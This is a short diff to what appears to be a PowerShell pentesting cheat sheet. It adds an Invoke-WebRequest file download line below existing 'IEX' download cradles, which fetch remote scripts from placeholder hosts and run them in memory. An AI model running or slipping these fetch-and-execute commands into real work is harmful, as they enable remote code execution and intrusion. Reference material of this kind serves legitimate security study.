@@ -1135,6 +1135,7 @@ whoami /all
 IEX(IWR('http://URL_here/file_here'))
 IEX/New-Object Net.WebClient().downloadString('http://IP_here/path/to/file')
 IEX(New-Object Net.WebClient).downloadString('http://IP_here/path/to/file')
+Invoke-WebRequest -Uri http://IP_here/path/to/file -OutFile /path/to/outfile
 
 # read text file
 Get-Content file_name-here
